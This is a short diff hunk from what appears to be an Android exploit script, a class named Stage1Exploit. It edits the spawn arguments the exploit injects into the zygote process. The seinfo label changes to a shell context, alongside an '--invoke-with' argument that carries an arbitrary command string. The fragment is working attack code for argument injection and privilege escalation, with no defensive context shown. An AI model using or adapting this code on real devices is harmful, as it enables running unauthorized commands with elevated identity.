@@ -196,7 +196,7 @@ class Stage1Exploit:
             "--app-data-dir=/data/user/0/com.android.shell",
             "--runtime-args",
             "--nice-name=shell",
-            "--seinfo=platform:privapp:system_app:targetSdkVersion=28:complete",
+            "--seinfo=platform:shell:complete",
             "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
